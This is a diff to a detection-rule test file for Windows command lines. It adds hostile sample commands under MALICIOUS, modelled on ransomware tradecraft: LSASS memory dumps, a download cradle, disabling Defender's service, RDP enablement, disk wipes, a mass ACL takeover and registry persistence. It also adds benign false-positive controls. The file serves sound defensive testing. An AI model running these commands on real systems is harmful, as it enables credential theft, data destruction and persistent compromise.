@@ -234,6 +234,38 @@ MALICIOUS = [
     ("cipher-freespace-wipe", "cipher.exe", "cmd.exe", "cipher /w:c:\\", ""),
     ("rclone-cloud-exfil", "rclone.exe", "cmd.exe",
      "rclone copy c:\\data mega:backup --transfers 20", ""),
+    # Round-2 Akira/Medusa/Snatch probe: safe-mode boot, RDP enable, sdelete
+    # wipe, mass ACL takeover.
+    ("bcdedit-safe-mode-boot", "bcdedit.exe", "cmd.exe",
+     "bcdedit /set {default} safeboot minimal", ""),
+    ("rdp-enable-registry", "reg.exe", "cmd.exe",
+     'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', ""),
+    ("sdelete-secure-wipe", "sdelete.exe", "cmd.exe", "sdelete.exe -p 3 -s -z c:", ""),
+    ("mass-acl-takeover", "icacls.exe", "cmd.exe",
+     "icacls c:\\ /grant everyone:F /t /c /q", ""),
+    # Adaptive-hardening LSASS class: generalized dump-intent + rdrleakdiag LOLBin.
+    # These true-positives were HELD-OUT evaders before the generalization.
+    ("lsass-memory-dump-generic", "x.exe", "cmd.exe",
+     "x.exe --dump-lsass --pid 640 -o c:\\l.dmp", ""),
+    ("rdrleakdiag-memory-dump", "rdrleakdiag.exe", "cmd.exe",
+     "rdrleakdiag.exe /p 640 /o c:\\ /fullmemdmp /wait 1", ""),
+    # Adaptive-hardening T1105 class: generic download cradle (renamed tool /
+    # novel method) — a HELD-OUT evader before the generalization.
+    ("remote-fetch-executable-generic", "cu.exe", "cmd.exe",
+     "cu.exe -urlcache -f http://x/a.exe a.exe", ""),
+    ("service-disable-registry-start", "reg.exe", "cmd.exe",
+     "reg add HKLM\\System\\CurrentControlSet\\Services\\Sense /v Start /t REG_DWORD /d 4 /f", ""),
+    # Adaptive-hardening persistence class: write-tool-agnostic autostart.
+    ("persistence-runkey-generic", "powershell.exe", "cmd.exe",
+     "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name x -Value c:\\evil.exe", ""),
+    ("persistence-winlogon-generic", "powershell.exe", "cmd.exe",
+     "Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -Name Shell -Value 'explorer.exe,evil.exe'", ""),
+    ("persistence-logon-script", "reg.exe", "cmd.exe",
+     "reg add HKCU\\Environment /v UserInitMprLogonScript /d c:\\evil.bat /f", ""),
+    ("persistence-powershell-profile", "powershell.exe", "cmd.exe",
+     "Add-Content $PROFILE 'Start-Process c:\\evil.exe'", ""),
+    ("persistence-silent-process-exit", "reg.exe", "cmd.exe",
+     "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d evil.exe /f", ""),
 ]
 
 # Benign command shapes that must NEVER fire any rule.
@@ -254,6 +286,16 @@ BENIGN = [
     ("sc.exe", "cmd.exe", "sc query windefend", ""),                              # query, not create
     ("schtasks.exe", "cmd.exe", "schtasks /query", ""),                           # query, not create
     ("wmic.exe", "cmd.exe", "wmic os get caption", ""),                           # info, not process-call/node
+    # LSASS-class FP boundary (adaptive-hardening 2026-08-16): mentioning lsass,
+    # or dumping a NON-lsass process, must never fire the credential-dump rules.
+    ("tasklist.exe", "cmd.exe", "tasklist /fi \"imagename eq lsass.exe\"", ""),   # list lsass, not dump
+    ("powershell.exe", "cmd.exe", "Get-Process lsass", ""),                        # inspect lsass, not dump
+    ("procdump.exe", "cmd.exe", "procdump.exe -ma notepad.exe c:\\n.dmp", ""),     # dump NON-lsass (debugging)
+    ("wmic.exe", "cmd.exe", "wmic process where name='lsass.exe' get processid", ""),  # query pid, not dump
+    # T1105 download-cradle FP boundary (adaptive-hardening 2026-08-16): fetching
+    # non-executable content, or hashing a local exe, must not fire the cradle rule.
+    ("curl.exe", "cmd.exe", "curl https://api.github.com/repos -o data.json", ""),  # json, not payload
+    ("powershell.exe", "cmd.exe", "powershell iwr https://example.com/page.html -OutFile page.html", ""),  # html, not payload
     ("winword.exe", "explorer.exe", "winword.exe report.docx", r"C:\Program Files\Microsoft Office\winword.exe"),
     ("msbuild.exe", "devenv.exe", "msbuild project.sln", r"C:\Program Files\dotnet\msbuild.exe"),
     # Regression controls for the redteam-evaluation T1489/T1570 findings:
